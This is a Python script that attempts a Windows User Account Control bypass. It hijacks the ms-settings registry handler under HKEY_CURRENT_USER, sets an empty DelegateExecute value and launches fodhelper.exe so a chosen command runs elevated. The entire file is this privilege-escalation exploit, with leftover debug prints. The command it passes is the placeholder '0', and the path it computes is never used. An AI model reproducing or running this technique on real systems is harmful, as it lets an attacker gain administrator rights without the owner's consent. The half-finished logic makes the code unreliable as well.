import os
import sys
import ctypes
import winreg

CMD                   = r"C:\Windows\System32\cmd.exe"
FOD_HELPER            = r'C:\Windows\System32\fodhelper.exe'
PYTHON_CMD            = "python"
REG_PATH              = 'Software\Classes\ms-settings\shell\open\command'
DELEGATE_EXEC_REG_KEY = 'DelegateExecute'

def is_running_as_admin():
    '''
    Checks if the script is running with administrative privileges.
    Returns True if is running as admin, False otherwise.
    '''    
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def create_reg_key(key, value):
    '''
    Creates a reg key
    '''
    try:        
        winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)
        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE)                
        winreg.SetValueEx(registry_key, key, 0, winreg.REG_SZ, value)        
        winreg.CloseKey(registry_key)
    except WindowsError:        
        raise

def bypass_uac(cmd):
    '''
    Tries to bypass the UAC
    '''
    try:
        create_reg_key(DELEGATE_EXEC_REG_KEY, '')
        create_reg_key(None, cmd)    
    except WindowsError:
        print(00)
        raise

def execute():        
    if not is_running_as_admin():
        print ('[!] The script is NOT running with administrative privileges')
        print ('[+] Trying to bypass the UAC')
        try:
            aos=os.path.realpath(__file__).split("\\")[-1].split("py")[0]+"exe"
            aos2=os.path.dirname(os.path.abspath(sys.executable))
            current_dir=aos2+"\\"+aos
            cmd = '0'
            print(cmd)
            bypass_uac(cmd)                
            os.system(FOD_HELPER)                
            print(1)           
        except WindowsError:
            print(0) 
    else:
        print ('[+] The script is running with administrative privileges!')

if __name__ == '__main__':
    execute()